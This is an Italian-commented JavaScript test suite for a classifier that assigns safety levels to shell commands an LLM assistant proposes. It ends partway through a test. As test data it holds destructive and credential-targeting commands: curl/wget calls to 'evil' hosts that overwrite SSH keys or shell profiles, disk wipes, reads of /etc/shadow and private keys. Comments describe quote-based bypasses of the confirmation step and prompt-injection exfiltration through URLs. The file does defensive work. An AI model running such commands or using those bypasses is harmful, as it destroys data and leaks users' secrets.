// Unit test per src/shared/cmdClassify.js — il classificatore comando→livello
// di sicurezza (#146.6). La classificazione DEVE avvenire sul comando effettivo
// (mai fidarsi dell'LLM): qui copriamo molte combinazioni perché è il punto
// dove un errore = un comando pericoloso eseguito con troppa poca frizione.
//
// Mappa livelli: 1 = sola lettura (esegue subito) · 2 = recuperabile (popup) ·
// 3 = cancellazioni / pericolosi / non riconosciuti / concatenati ("conferma").

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const require = createRequire(import.meta.url);
const __dirname = dirname(fileURLToPath(import.meta.url));
require(join(__dirname, '..', '..', 'src', 'shared', 'cmdClassify.js'));

const C = globalThis.SN_CMD_CLASSIFY;
const lvl = (cmd) => C.classify(cmd);

test('il modulo si registra su globalThis con la sua API', () => {
  assert.ok(C);
  assert.equal(typeof C.classify, 'function');
});

test('livello 1 — comandi di sola lettura in whitelist eseguono subito', () => {
  for (const cmd of [
    'ls', 'ls -la', 'dir', 'pwd', 'cat package.json', 'type file.txt',
    'echo ciao', 'whoami', 'hostname', 'date', 'head -n 20 log.txt',
    'tail -f out.log', 'tree', 'wc -l file', 'grep foo file', 'findstr foo file',
    'where node', 'which git',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" dovrebbe essere livello 1`);
  }
});

test('livello 1 — git e npm di sola lettura', () => {
  for (const cmd of [
    'git status', 'git log', 'git log --oneline -10', 'git diff', 'git diff HEAD~1',
    'git show', 'git branch', 'git remote -v', 'git config --get user.name',
    'npm list', 'npm ls', 'npm --version', 'npm view react', 'npm outdated',
    'pip list', 'git', 'npm',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" dovrebbe essere livello 1`);
  }
});

test('livello 2 — modifiche recuperabili chiedono conferma (popup)', () => {
  for (const cmd of [
    'git push', 'git push origin main', 'git commit -m "x"', 'git add .',
    'git pull', 'git fetch', 'git checkout main', 'git merge dev',
    'npm install', 'npm i', 'npm ci', 'npm install lodash', 'npm uninstall lodash',
    'npm update', 'mkdir build', 'md build', 'touch nuovo.txt',
    'cp a.txt b.txt', 'copy a b', 'mv a.txt b.txt', 'move a b',
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" dovrebbe essere livello 2`);
  }
});

test('livello 3 — cancellazioni richiedono di digitare "conferma"', () => {
  for (const cmd of [
    'rm file', 'rm -rf node_modules', 'rmdir build', 'rd /s build',
    'del file.txt', 'erase file', 'unlink file', 'shred segreto',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" dovrebbe essere livello 3`);
  }
});

test('livello 3 — comando inventato / non riconosciuto è livello 3 di default', () => {
  for (const cmd of ['foobar', 'pippo --pluto', 'qualcosadiinventato x y', './configure', './script.sh', 'whatevs']) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (non standard) dovrebbe essere livello 3`);
  }
});

test('livello 3 — concatenazioni e redirezioni (non interamente riconoscibili)', () => {
  for (const cmd of [
    'ls && rm -rf x',          // && con un comando di per sé livello 1
    'git status; rm file',     // ;
    'cat file | rm x',         // | pipe con un pezzo distruttivo
    'echo ciao > file.txt',    // > redirezione
    'echo ciao >> file.txt',   // >>
    'cat < input.txt',         // < redirezione
    'echo `whoami`',           // backtick
    'echo $(whoami)',          // $()
    'ls & dir',                // & background/call
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" con metacaratteri dovrebbe essere livello 3`);
  }
});

test('sequenza sicura — letture concatenate con && / ; / || restano livello 1', () => {
  // Il caso del feedback #201: `cd Desktop && ls` sono due letture, concatenarle
  // non deve farle salire a livello 3 ("conferma" per un'azione irreversibile).
  for (const cmd of [
    'cd Desktop && ls',
    'cd Desktop&&ls',
    'cd .. && pwd && ls -la',
    'ls; pwd',
    'cat a.txt || echo vuoto',
    'cd C:\\Users && dir',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (sequenza di sole letture) dovrebbe essere livello 1`);
  }
});

test('sequenza — il livello è il MASSIMO dei pezzi', () => {
  assert.equal(lvl('cd build && mkdir out'), 2, 'cd(1) && mkdir(2) → 2');
  assert.equal(lvl('git status && git push'), 2, 'lettura(1) && push(2) → 2');
  assert.equal(lvl('cd x && rm -rf y'), 3, 'cd(1) && rm(3) → 3');
  assert.equal(lvl('ls && foobar'), 3, 'ls(1) && sconosciuto(3) → 3');
  assert.equal(lvl('cd x && node app.js'), 3, 'cd(1) && interprete(3) → 3');
});

test('mescolare sequenza e pipe NON è sicuro → resta 3', () => {
  // Una pipeline di sole letture scende a 1 (vedi più sotto), ma MESCOLARLA con
  // `&&`/`;`/`&`/redirezioni no: il comando non è più interamente riconoscibile.
  for (const cmd of [
    'cat a && ls | cat', // pipe dentro una sequenza
    'ls | cat && rm x',  // sequenza dentro una pipe
    'ls & pwd',          // background
    'cd x && ls > out',  // redirezione
    'cd x && echo $(pwd)',
    'ls | cat > out.txt',// pipe che finisce in una redirezione
    'ls || rm x',        // `||` è una sequenza, non una pipe: vale il massimo
    'ls |',              // pipe monca
    '| ls',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" non è riconoscibile per intero → livello 3`);
  }
});

test('livello 3 — flag pericolosi alzano un comando altrimenti ≤2', () => {
  assert.equal(lvl('git reset --hard'), 3);
  assert.equal(lvl('git clean -fd'), 3);
  assert.equal(lvl('git push --force'), 3);
  assert.equal(lvl('git checkout --force main'), 3);
  assert.equal(lvl('git branch -D feature'), 3); // -D = force delete
});

test('git checkout/stash distruttivi (scartano lavoro non salvato) → livello 3', () => {
  // Feedback #390: le forme di checkout/stash che buttano via modifiche non
  // salvate devono chiedere di digitare "conferma" (3), come restore/reset --hard.
  for (const cmd of [
    'git checkout .',                 // scarta TUTTE le modifiche del working tree
    'git checkout -- file.txt',       // scarta un file specifico
    'git checkout -- .',              // separatore + tutto
    'git checkout HEAD -- src',       // ripristina path da un ref
    'git checkout HEAD file.txt',     // <ref> <path> senza `--`
    'git checkout main src/app.js',   // <ref> <path>
    'git checkout --discard-changes', // butta via le modifiche (anche per switch)
    'git switch --discard-changes main',
    'git stash drop',                 // elimina uno stash salvato
    'git stash drop stash@{1}',
    'git stash clear',                // elimina TUTTI gli stash
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (scarta lavoro non salvato) dovrebbe essere livello 3`);
  }
});

test('git checkout/stash NON distruttivi restano livello 2 (solo conferma OK)', () => {
  // La discriminante è il pathspec: cambio/creazione ramo e salvataggio stash
  // non buttano via nulla di irreversibile → non devono chiedere di digitare
  // "conferma", solo un OK.
  for (const cmd of [
    'git checkout main',              // cambio ramo
    'git checkout -b nuovo',          // crea ramo
    'git checkout -b nuovo origin/main', // crea ramo da start-point (2 operandi ma -b)
    'git checkout -B forza',          // ricrea ramo
    'git checkout -',                 // torna al ramo precedente
    'git stash',                      // salva le modifiche (recuperabile con pop)
    'git stash push -m wip',
    'git stash pop',                  // riapplica (recuperabile)
    'git stash apply',
    'git stash list',
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (non distruttivo) dovrebbe essere livello 2`);
  }
});

test('git checkout/stash: le virgolette non abbassano il livello (bypass #390)', () => {
  // Feedback #390, secondo giro: la conferma forte si aggirava riscrivendo lo
  // STESSO comando distruttivo con virgolette che la shell (bash/cmd/powershell)
  // rimuove comunque — attorno al bersaglio, vuote prima/dopo, perfino in mezzo
  // alla parola. Il comando eseguito è identico, quindi il livello deve esserlo.
  for (const cmd of [
    'git checkout "."', "git checkout '.'",         // punto tra virgolette
    'git checkout .""', "git checkout .''",         // virgolette vuote DOPO
    'git checkout "".', "git checkout ''.",         // virgolette vuote PRIMA
    'git checkout "" .',                            // token vuoto separato
    'git "checkout" .', 'git checkout "--" file.txt',
    'git stash "drop"', "git stash 'clear'",
    "git stash drop''", "git stash ''clear", "git stash d''rop",
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" fa lo stesso danno della forma nuda → livello 3`);
  }
  // …e non alza quelle innocue scritte con le stesse virgolette.
  for (const cmd of ['git checkout "main"', "git checkout 'main'", 'git stash "pop"', 'git "checkout" -b nuovo']) {
    assert.equal(lvl(cmd), 2, `"${cmd}" resta non distruttivo → livello 2`);
  }
});

test('git checkout: pathspec scritti in altre forme (barra, backslash, glob, estensione)', () => {
  // Tutte forme che git risolve come PERCORSI: `git checkout <percorso>` scarta
  // le modifiche non salvate di quei file esattamente come `git restore`.
  for (const cmd of [
    'git checkout ./',              // cartella corrente con la barra
    'git checkout .\\',             // idem in stile Windows
    'git checkout .\\src',          // percorso relativo Windows
    'git checkout ../',             // cartella superiore
    'git checkout \\.',             // punto con escape (bash)
    'git checkout src/',            // cartella
    'git checkout src/app.js',      // file con estensione
    'git checkout README.md',
    'git checkout "*.js"',          // glob
    'git checkout /home/user/x.txt',// percorso assoluto
    'git stash d\\rop',             // verbo con escape (bash)
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" prende di mira dei file → livello 3`);
  }
  // I nomi di ramo che ASSOMIGLIANO a percorsi restano livello 2: non buttano
  // via nulla e chiedere "conferma" a ogni cambio ramo sarebbe solo attrito.
  for (const cmd of ['git checkout origin/main', 'git checkout feature/login', 'git checkout v1.0', 'git checkout release-2']) {
    assert.equal(lvl(cmd), 2, `"${cmd}" è un cambio ramo → livello 2`);
  }
});

test('git checkout: flag che prendono di mira i file → livello 3', () => {
  // Verificato eseguendoli davvero in un repo con modifiche non salvate:
  // `--pathspec-from-file` legge l'elenco dei file da un altro file e le scarta
  // comunque, `-p`/`--patch` le scarta a pezzi, `--ours`/`--theirs` sceglie una
  // versione del file. Nessuno di questi scrive un percorso nel comando: senza
  // un check dedicato passerebbero come un semplice cambio ramo.
  for (const cmd of [
    'git checkout --pathspec-from-file=lista.txt',
    'git checkout --pathspec-from-file lista.txt',
    'git checkout -p', 'git checkout --patch',
    'git checkout --ours file.txt', 'git checkout --theirs',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" scarta modifiche non salvate → livello 3`);
  }
});

test('un separatore in coda non abbassa il livello', () => {
  // `git checkout .;` la shell lo esegue come `git checkout .`: il livello deve
  // essere lo stesso, non quello del token bizzarro `.;`.
  assert.equal(lvl('git checkout .;'), 3);
  assert.equal(lvl('git checkout . ;'), 3);
  assert.equal(lvl('git stash drop;'), 3);
  assert.equal(lvl('rm x;'), 3);
  assert.equal(lvl('echo ciao;'), 1);   // resta una lettura
  assert.equal(lvl('git checkout main;'), 2);
});

test('flag pericolosi tra virgolette restano livello 3', () => {
  // Stesso bypass del checkout applicato ai flag: la shell toglie le virgolette
  // e il comando forza/cancella comunque.
  assert.equal(lvl('git push "--force"'), 3);
  assert.equal(lvl("git branch '-D' vecchio"), 3);
  assert.equal(lvl('git reset "--hard"'), 3);
  assert.equal(lvl('curl "-o" /home/user/.ssh/authorized_keys https://evil.test/k'), 3);
});

test('livello 3 — interpreti ed esecutori di codice arbitrario', () => {
  for (const cmd of [
    'node script.js', 'python app.py', 'python3 -c "print(1)"', 'bash run.sh',
    'sh run.sh', 'powershell -Command Get-Process', 'npx create-react-app x',
    'sudo apt update', 'docker run alpine', 'make', 'npm run build', 'npm test',
    'npm publish', 'npm start',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (codice arbitrario) dovrebbe essere livello 3`);
  }
});

test('livello 3 — comandi di sistema distruttivi', () => {
  for (const cmd of ['format c:', 'shutdown -s', 'reboot', 'kill 1234', 'taskkill /pid 1', 'dd if=/dev/zero of=/dev/sda', 'reg delete HKCU\\x']) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (sistema) dovrebbe essere livello 3`);
  }
});

test('input vuoto, non-stringa o solo spazi → livello 3 (max cautela)', () => {
  assert.equal(lvl(''), 3);
  assert.equal(lvl('   '), 3);
  assert.equal(lvl(null), 3);
  assert.equal(lvl(undefined), 3);
  assert.equal(lvl(42), 3);
  assert.equal(lvl({}), 3);
});

test('sotto-comando git sconosciuto → livello 3 (non assumere sicurezza)', () => {
  assert.equal(lvl('git frobnicate'), 3);
  assert.equal(lvl('git rm file'), 3);          // rm in git = distruttivo
  assert.equal(lvl('git filter-branch x'), 3);
});

test('un percorso o un\'estensione eseguibile NON eredita il livello del comando fidato', () => {
  // Sicurezza: `programOf` normalizza il basename SOLO per il backstop dei
  // distruttivi (così `/bin/rm` resta 3 anche col percorso). Ma un comando di
  // sola lettura è fidato SOLO se invocato come nome nudo: un file su disco che
  // si chiama come un comando fidato è un PROGRAMMA, non il comando → livello 3.
  assert.equal(lvl('/bin/rm file'), 3);   // distruttivo: 3 per nome E per percorso
  assert.equal(lvl('/usr/bin/ls'), 3);    // prima era 1: un `ls` in un percorso non è fidato
  assert.equal(lvl('C:\\Windows\\System32\\where.exe foo'), 3);
  assert.equal(lvl('ls'), 1);             // nudo: resta 1
  assert.equal(lvl('where node'), 1);
});

test('livello 1 — interrogazioni di versione/help dei tool comuni (sola lettura)', () => {
  for (const cmd of [
    'node --version', 'node -v', 'python --version', 'python -V', 'python3 --version',
    'go version', 'docker --version', 'docker --help', 'kubectl version',
    'java -version', 'dotnet --version', 'rustc --version', 'cargo --version',
    'cargo -V', 'tsc --version', 'gcc --version', 'ruby -v', 'php --version',
    'deno --version', 'npx --version', 'mvn --version', 'gradle --version',
    // anche i tool LEVEL2 ridotti a --version/--help sono lettura
    'curl --version', 'tar --version', 'mkdir --help', 'wget --version',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (versione/help) dovrebbe essere livello 1`);
  }
});

test('livello 3 — gli stessi interpreti restano 3 quando eseguono codice', () => {
  for (const cmd of [
    'node', 'node app.js', 'python -c "print(1)"', 'go run main.go', 'go build',
    'docker run alpine', 'docker ps', 'cargo build', 'npx create-react-app x',
    'java -jar app.jar', 'make all', 'code .',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (esecuzione) dovrebbe restare livello 3`);
  }
});

test('le shell dirette restano sempre 3, anche con flag di versione', () => {
  // `bash` da solo apre una sessione interattiva; nessuna eccezione versione.
  assert.equal(lvl('bash'), 3);
  assert.equal(lvl('bash --version'), 3);
  assert.equal(lvl('powershell -Command Get-Process'), 3);
  assert.equal(lvl('sh'), 3);
});

test('livello 1 — comandi di diagnostica di sola lettura aggiunti', () => {
  for (const cmd of ['free -h', 'lscpu', 'lsblk', 'whereis node', 'who', 'sha256sum file']) {
    assert.equal(lvl(cmd), 1, `"${cmd}" dovrebbe essere livello 1`);
  }
});

// ── #587: leggere non è gratis ───────────────────────────────────────────────
// Il contenuto letto entra nel contesto del modello, e da lì una pagina ostile
// che lo pilota può riscriverlo dentro un URL. Le letture che espongono materiale
// personale chiedono un OK (livello 2): non sono vietate, sono dichiarate.

test('livello 2 — ambiente e processi non sono livello 1 (#587)', () => {
  for (const cmd of [
    'printenv', 'printenv PATH',              // token e percorsi del profilo
    'ps', 'ps aux', 'ps -ef',                 // righe di comando altrui: password in chiaro
    'Get-Process', 'Get-Process -Name filo', 'gps', // stessa cosa, altra shell → stesso livello
    'Get-ChildItem Env:', 'Get-Item Env:\\PATH',
    'echo $HOME', 'cat $HOME/note.txt', 'Get-Content $env:USERPROFILE\\note.txt',
    'type %APPDATA%\\Filo\\storage.json',
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" non deve essere livello 1 (#587)`);
  }
});

test('livello 1 — l’interrogazione di versione resta lettura pura anche qui', () => {
  assert.equal(lvl('ps --version'), 1);
  assert.equal(lvl('printenv --version'), 1);
});

test('livello 2 — la lettura FUORI dal perimetro dichiarato chiede un OK (#587)', () => {
  const dentro = { perimetro: '/home/mario', cwd: '/home/mario/progetto', home: '/home/mario' };
  // Dentro la cartella dell'utente: zero attrito, come prima.
  for (const cmd of ['cat appunti.txt', 'head -n 20 log.txt', 'grep errore src/app.js', 'ls', 'cat ../note.txt']) {
    assert.equal(C.classify(cmd, dentro), 1, `"${cmd}" dentro il perimetro resta livello 1`);
  }
  // Fuori: percorsi assoluti altrove, risalite che escono, `~` che punta altrove.
  for (const cmd of [
    'cat /etc/passwd', 'head -n 5 /etc/shadow', 'grep -r token /var/log',
    'cat ../../../etc/hosts', 'Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts',
    'ls /root', 'tail -f /var/log/syslog',
    // vale identico per i cmdlet: due strade per la stessa cosa, stesso livello
    'Get-ChildItem -Path C:\\Users -Recurse', 'Test-Path C:\\Users',
    'Select-String password -Path /etc/apache2/apache2.conf',
    'Get-Content /etc/passwd | Select-String root',   // la pipeline non è una scappatoia
  ]) {
    assert.equal(C.classify(cmd, dentro), 2, `"${cmd}" esce dal perimetro → livello 2`);
  }
});

test('livello 2 — i bersagli riservati non sono livello 1 nemmeno dentro il perimetro (#587)', () => {
  const scope = { perimetro: '/home/mario', cwd: '/home/mario', home: '/home/mario' };
  for (const cmd of [
    'cat ~/.ssh/id_rsa', 'cat .ssh/id_ed25519', 'ls ~/.aws', 'cat .aws/credentials',
    'cat .env', 'cat .env.local', 'grep KEY .npmrc', 'cat .git-credentials',
    'cat .bash_history', 'type AppData\\Roaming\\Filo\\storage.json',
    'Get-Content .config/filo/segreti.json',
  ]) {
    assert.equal(C.classify(cmd, scope), 2, `"${cmd}" punta a dati riservati → livello 2`);
  }
});

test('SICUREZZA — il `cd` non sposta il perimetro, dentro e fra i turni (#587)', () => {
  const scope = { perimetro: '/home/mario', cwd: '/home/mario', home: '/home/mario' };
  // Nella stessa sequenza il `cd` viene SEGUITO: `passwd` è /etc/passwd, non
  // /home/mario/passwd. Senza questo, concatenare basterebbe a evadere il freno.
  assert.equal(C.classify('cd /etc && cat passwd', scope), 2);
  assert.equal(C.classify('cd /etc; head -n 3 shadow', scope), 2);
  // E fra un turno e l'altro: il main passa la cartella corrente VERA, quindi il
  // comando successivo viene misurato lì.
  assert.equal(C.classify('cat passwd', { ...scope, cwd: '/etc' }), 2);
  // Spostarsi non legge niente: `cd` da solo resta livello 1 (senza conferma non
  // sarebbe più usabile — è la primitiva di navigazione dell'assistente).
  assert.equal(C.classify('cd /etc', scope), 1);
  assert.equal(C.classify('cd ..', scope), 1);
  assert.equal(C.classify('cd sub && ls', scope), 1);
});

test('senza perimetro dichiarato resta il freno strutturale (#587)', () => {
  // Il classificatore usato da solo (nessuna cartella nota) non può risolvere i
  // relativi: assoluti e risalite valgono comunque "fuori".
  assert.equal(lvl('cat /etc/passwd'), 2);
  assert.equal(lvl('cat ../segreti.txt'), 2);
  assert.equal(lvl('cat ~/.ssh/id_rsa'), 2);
  assert.equal(lvl('cat package.json'), 1);
  assert.equal(lvl('grep foo src/app.js'), 1);
});

test('il perimetro regge i casi limite (#587)', () => {
  const scope = { perimetro: '/home/mario', cwd: '/home/mario', home: '/home/mario' };
  // Confronto per SEGMENTI, non per prefisso di stringa: una cartella che inizia
  // con lo stesso testo non è dentro.
  assert.equal(C.classify('cat /home/mario2/x', scope), 2);
  assert.equal(C.classify('cat /home/mario', scope), 1);
  assert.equal(C.classify('cat ~', scope), 1);
  // `..` in mezzo che NON esce resta dentro; quello che esce no.
  assert.equal(C.classify('cat ./sub/../note.txt', scope), 1);
  assert.equal(C.classify('cat sub/../../fuori.txt', scope), 2);
  // Nomi non ASCII, nomi con spazi, comandi lunghissimi: nessun errore, nessun
  // livello inventato.
  assert.equal(C.classify('cat 文書/メモ.txt', scope), 1);
  assert.equal(C.classify('cat "file con spazi.txt"', scope), 1);
  assert.equal(C.classify(`cat ${'a'.repeat(10000)}`, scope), 1);
  assert.equal(C.classify(`cat ${'../'.repeat(3000)}etc/passwd`, scope), 2);
  // Un `$` che non nomina una variabile (regex di ricerca) non deve alzare.
  assert.equal(C.classify('grep $ file', scope), 1);
  assert.equal(C.classify('echo costo$', scope), 1);
  // Comando vuoto o assente: resta il 3 di massima cautela di sempre.
  assert.equal(C.classify('', scope), 3);
  assert.equal(C.classify('   ', scope), 3);
  assert.equal(C.classify(null, scope), 3);
});

test('il motivo della conferma è leggibile (finisce nel popup) (#587)', () => {
  const scope = { perimetro: '/home/mario', cwd: '/home/mario', home: '/home/mario' };
  assert.match(C.readReason('tail -n 50 /var/log/syslog', scope), /fuori dalla tua cartella/);
  assert.match(C.readReason('cat ~/.ssh/id_rsa', scope), /\.ssh/);
  assert.match(C.readReason('printenv', scope), /variabili d’ambiente/);
  assert.equal(C.readReason('cat appunti.txt', scope), '');
});

test('livello 1 — date/hostname senza argomenti mutanti restano lettura', () => {
  for (const cmd of [
    'date', 'date +%Y-%m-%d', 'date -u', 'date -R', 'date -d "yesterday"',
    'date --date=@1700000000', 'date +%s',
    'hostname', 'hostname -f', 'hostname -I', 'hostname -i', 'hostname -d',
    'hostname -s', 'hostname -A',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (lettura) dovrebbe essere livello 1`);
  }
});

test('livello 2 — date -s / hostname <nome> modificano lo stato → conferma', () => {
  // Feedback #311: comandi che cambiano orologio o nome host venivano eseguiti
  // subito perché trattati come sola lettura; ora chiedono conferma.
  for (const cmd of [
    'date -s "2020-01-01 00:00:00"', 'date --set="2020-01-01 00:00:00"',
    'date --set 2020-01-01', 'date -s 010100002020',
    'hostname nuovonome', 'hostname test', 'hostname -F /etc/hostname',
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (modifica stato) dovrebbe essere livello 2`);
  }
});

test('sequenza — date -s dentro una catena alza il livello a 2', () => {
  assert.equal(lvl('cd /tmp && date -s "2020-01-01 00:00:00"'), 2);
  assert.equal(lvl('hostname evil && ls'), 2);
});

test('livello 2 — git tag/branch con un nome CREANO (feedback #285) → conferma', () => {
  // Feedback #285: `git tag v1.0` e `git branch nuovo-branch` modificano la repo
  // (creano tag/branch) ma partivano subito, come una lettura. Ora chiedono
  // conferma perché hanno un operando dopo il sotto-comando.
  for (const cmd of [
    'git tag v1.0', 'git tag release-2', 'git tag -a v1.0 -m "rilascio"',
    'git branch nuovo-branch', 'git branch feature/x', 'git branch -m vecchio nuovo',
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (crea/rinomina) dovrebbe essere livello 2`);
  }
});

test('livello 1 — git tag/branch NUDI o con soli flag di lettura ELENCANO', () => {
  // La forma senza operando è pura lettura (elenca): resta livello 1.
  for (const cmd of [
    'git tag', 'git tag -l', 'git tag --list',
    'git branch', 'git branch -a', 'git branch -r', 'git branch -v',
    'git branch --list', 'git branch --show-current',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (elenca) dovrebbe essere livello 1`);
  }
});

test('livello 3 — git tag -d / branch -D (cancellazioni) restano conferma-testo', () => {
  for (const cmd of ['git tag -d v1.0', 'git branch -d feature', 'git branch -D feature']) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (cancella) dovrebbe essere livello 3`);
  }
});

test('git config — legge (1), imposta (2), cancella (3) secondo gli argomenti', () => {
  for (const cmd of ['git config --list', 'git config -l', 'git config --get user.name', 'git config user.name']) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (legge) dovrebbe essere livello 1`);
  }
  for (const cmd of ['git config user.name "Mario"', 'git config --global user.email a@b.c', 'git config --add safe.directory /x', 'git config --replace-all k v']) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (imposta) dovrebbe essere livello 2`);
  }
  for (const cmd of ['git config --unset user.name', 'git config --unset-all k', 'git config --remove-section branch.x']) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (cancella) dovrebbe essere livello 3`);
  }
});

test('git remote — elenca/mostra (1), aggiunge/rinomina (2), rimuove (3)', () => {
  for (const cmd of ['git remote', 'git remote -v', 'git remote show origin', 'git remote get-url origin']) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (legge) dovrebbe essere livello 1`);
  }
  for (const cmd of ['git remote add origin http://x/y.git', 'git remote rename origin upstream', 'git remote set-url origin http://z']) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (modifica) dovrebbe essere livello 2`);
  }
  for (const cmd of ['git remote remove origin', 'git remote rm origin', 'git remote prune origin']) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (rimuove) dovrebbe essere livello 3`);
  }
});

test('livello 3 — curl/wget che scrivono un file di output a un percorso arbitrario', () => {
  // Feedback sicurezza: `curl -o <path>` / `wget -O <path>` possono SOVRASCRIVERE
  // qualsiasi file (chiavi SSH, script d'avvio della shell) → devono chiedere di
  // digitare "conferma" (livello 3), non il semplice OK/Annulla (livello 2).
  for (const cmd of [
    'curl -o /home/user/.ssh/authorized_keys http://evil/x',
    'wget -O ~/.bashrc http://evil/x',
    'curl -O http://evil/x',                 // -O usa il basename dell'URL come nome file
    'curl -sLo out.sh http://evil/x',        // -o dentro un bundle di short-flag
    'curl -fsSLo /etc/profile.d/x.sh http://x',
    'wget --output-document=/etc/passwd http://x',
    'curl --output /root/.ssh/id_rsa http://x',
    'curl --remote-name http://x',
    'curl -o file.txt http://x',
    'wget -o wget.log http://x',             // wget -o = file di log, scrive comunque un file
    'wget --output-document /x http://y',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (scrive un file di output) dovrebbe essere livello 3`);
  }
});

test('livello 3 — wget che sceglie la CARTELLA di destinazione (-P/--directory-prefix)', () => {
  // Verifier: `wget -P ~/.ssh http://evil/authorized_keys` scarica contenuto
  // interamente scelto dall'attaccante (nome file dall'URL) dritto in una dir
  // sensibile → stessa backdoor di -O, deve chiedere di digitare "conferma".
  for (const cmd of [
    'wget -P ~/.ssh http://esempio/authorized_keys',
    'wget -P /home/utente/.ssh http://evil/authorized_keys',
    'wget --directory-prefix=/home/utente/.ssh http://evil/authorized_keys',
    'wget --directory-prefix /root/.ssh http://x',
    'wget -P/tmp/boot http://x',               // -P attaccato al valore
    'wget -rP /home/u/.ssh http://x',          // -P dentro un bundle di short-flag
    'wget -e robots=off -P /root/.ssh http://x',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (wget sceglie la cartella) dovrebbe essere livello 3`);
  }
});

test('livello 3 — curl che scrive gli header su un file arbitrario (-D/--dump-header)', () => {
  for (const cmd of [
    'curl -D /home/user/.ssh/authorized_keys http://evil/x',
    'curl --dump-header /root/.bashrc http://x',
    'curl -sD /etc/profile http://x',          // -D dentro un bundle di short-flag
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (dump header su file) dovrebbe essere livello 3`);
  }
});

test('livello 3 — curl che salva DATI ACCESSORI influenzati dal server su un file scelto', () => {
  // #332: cookie-jar, etag-save, trace/trace-ascii, stderr scrivono in un
  // percorso arbitrario contenuto deciso/influenzato dal remoto → digita "conferma".
  for (const cmd of [
    'curl -c /home/user/.ssh/authorized_keys http://evil/x',   // cookie-jar (short)
    'curl --cookie-jar /root/.bashrc http://x',
    'curl --cookie-jar=/root/.bashrc http://x',
    'curl -sc /root/.profile http://x',                        // -c dentro un bundle
    'curl -cs /root/.profile http://x',                        // -c a inizio bundle
    'curl --etag-save ~/.ssh/authorized_keys http://x',
    'curl --trace /root/.bashrc http://x',
    'curl --trace-ascii /root/.bashrc http://x',
    'curl --stderr /root/.bashrc http://x',
    'wget --save-cookies /root/.ssh/authorized_keys http://x', // simmetria wget
    'wget --save-cookies=/root/.bashrc http://x',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (dati accessori su file scelto) dovrebbe essere livello 3`);
  }
});

test('livello 2 — i flag curl di LETTURA simili ai write accessori restano 2', () => {
  // Non devono salire a 3: -C/--continue-at (riprende un download normale),
  // --cookie/-b e --load-cookies (LEGGONO i cookie), --etag-compare, --cacert/
  // --cert (leggono un certificato), --trace-time/--trace-ids (modificatori).
  for (const cmd of [
    'curl -C 0 http://x',                        // -C maiuscolo (resume): non è cookie-jar
    'curl --continue-at 100 http://x',
    'curl -b cookies.txt http://x',              // -b = legge i cookie
    'curl --cookie cookies.txt http://x',
    'curl --cacert /etc/ca.pem http://x',        // legge un CA cert
    'curl --cert client.pem http://x',
    'curl --compressed http://x',
    'curl --connect-timeout 5 http://x',
    'curl --etag-compare etag.txt http://x',     // confronta l'ETag (legge)
    'curl -k http://x',                          // -k minuscolo = --insecure, non --config
    'curl --insecure http://x',
    'curl -w "%{http_code}" http://x',           // -w che stampa e basta (nessun %output{})
    'curl --write-out "%{time_total}\\n" http://x',
    'curl --cert-status http://x',
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (flag di lettura) dovrebbe restare livello 2`);
  }
});

test('livello 3 — #479: wget fa SEMPRE atterrare un file su disco', () => {
  // L'invariante è sull'EFFETTO, non sul nome del flag. Senza flag di output
  // `wget <url>` scrive comunque un file: il nome lo sceglie l'URL (cioè il
  // server), la cartella è la cwd — che l'assistente sposta da sé con un `cd`
  // (livello 1, nessuna conferma, valido per i comandi successivi). Quindi
  // `cd ~/.ssh && wget http://evil/authorized_keys` sovrascrive la chiave
  // esattamente come `wget -O ~/.ssh/authorized_keys`, che già chiedeva di
  // digitare "conferma": deve chiederlo anche questo.
  for (const cmd of [
    'wget http://example.com/file',
    'wget http://evil/authorized_keys',
    'wget -q http://x',
    'wget -c http://x/file',                   // -c riprende: ACCODA a un file già lì
    'wget --continue http://x/file',
    'wget -N http://x/file',                   // -N: riscarica se più recente = SOVRASCRIVE
    'wget --timestamping http://x/file',
    'wget -p http://x',                        // -p = --page-requisites: scrive nella cwd
    'wget -np -r http://x/dir/',               // ricorsivo: scrive un albero nella cwd
    'wget --no-parent http://x',
    'wget --prefer-family=IPv4 http://x',
    'wget -r -l 2 http://x/dir/',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (wget scrive comunque un file) dovrebbe essere livello 3`);
  }
  // La strada che #479 dichiara equivalente a `wget -O`: spostarsi prima e poi
  // scaricare. La sequenza prende il massimo dei pezzi → 3.
